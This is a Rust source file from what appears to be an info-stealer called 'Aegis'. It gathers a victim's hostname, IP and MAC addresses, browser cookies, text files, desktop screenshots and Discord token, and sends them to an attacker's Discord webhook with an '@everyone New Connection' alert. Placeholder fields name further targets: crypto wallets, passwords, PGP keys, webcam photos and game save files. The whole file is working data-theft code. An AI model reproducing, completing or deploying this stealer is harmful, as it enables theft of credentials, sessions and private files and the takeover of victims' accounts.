use crate::utils::grab;
use crate::utils::webhook;
use crate::utils::webhook::{Embed, EmbedFooter, EmbedThumbnail, WebhookField};

pub async fn send_hook() {
    let uri: Option<&'static str> = option_env!("WEBHOOK_URI");

    let ip = grab::get_ip().await.unwrap_or_default();
    let embeds = [ Embed {
                title: "New Connection!".to_string(),
                description: "A new person has ran Aegis. Enjoy!".to_string(),
                footer: EmbedFooter {
                    text: "by @shoegazers (Rivers Frost) on GitHub! https://github.com/shoegazers/Aegis".to_string(),
                },
                thumbnail: EmbedThumbnail {
                    url: "https://cdn.discordapp.com/attachments/1502671248914780172/1502675954298912939/ebdc35ac12f72951ef450f3e50c685af.png?ex=6a009389&is=69ff4209&hm=85982e6905ed1242a9d5679807c5f94fdd1b711ea63f8c111863444a6c6920f2&".to_string(),
                },
                fields: [
                    WebhookField {
                        name: "General Information".to_string(),
                        value: format!("Hostname: {:?}\nIP Address: {:?}\nMAC Address: {:?}", grab::get_host(), ip, grab::get_mac()),
                        inline: false,
                    },
                    WebhookField {
                        name: "Browser Cookies".to_string(),
                        value: format!("{:?}", grab::grab_cookies().await.unwrap().join(", ")),
                        inline: false,
                    },
                    WebhookField {
                        name: "Crypto Wallets".to_string(),
                        value: "".to_string(),
                        inline: false,
                    },
                    WebhookField {
                        name: "Text Files".to_string(),
                        value: format!("{:?}", grab::grab_txts().await.unwrap().join(", ")),
                        inline: false,
                    },
                    WebhookField {
                        name: "Passwords".to_string(),
                        value: "".to_string(),
                        inline: false,
                    },
                    WebhookField {
                        name: "PGP Keys".to_string(),
                        value: "".to_string(),
                        inline: false,
                    },
                    WebhookField {
                        name: "Webcam Photo".to_string(),
                        value: "".to_string(),
                        inline: false,
                    },
                    WebhookField {
                        name: "Desktop Screenshot(s)".to_string(),
                        value: format!("{:?}", grab::screenshot_desktop_and_upload().await.unwrap().join(", ")),
                        inline: false,
                    },
                    WebhookField {
                        name: "Discord Token".to_string(),
                        value: format!("`{}`", grab::grab_discord_token().await.unwrap().join("")),
                        inline: false,
                    },
                    WebhookField {
                        name: "Minecraft SSID".to_string(),
                        value: "".to_string(),
                        inline: false,
                    },
                    WebhookField {
                        name: "Growtopia save.dat".to_string(),
                        value: "".to_string(),
                        inline: false,
                    },
                ].to_vec(),
            }];

    let hook = webhook::WebhookPayload {
                username: "Aegis".to_string(),
                avatar_url: "https://cdn.discordapp.com/attachments/1502671248914780172/1502675954298912939/ebdc35ac12f72951ef450f3e50c685af.png?ex=6a009389&is=69ff4209&hm=85982e6905ed1242a9d5679807c5f94fdd1b711ea63f8c111863444a6c6920f2&".to_string(),
                content: "@everyone > New Connection Established!".to_string(),
                embeds: embeds.to_vec(),
            };

    println!("Sending hook to: {:?}", uri);
    webhook::send(&uri.unwrap().to_string(), &hook).await;
    println!("Hook sent successfully");
}

/*Message::SendMongo => {
    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(utils::mongodb::insert(
        &self.mongodb_uri.as_str(),
        Some(format!("{:?}", grab::get_host()).as_str()),
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
        None,
    ));
}*/
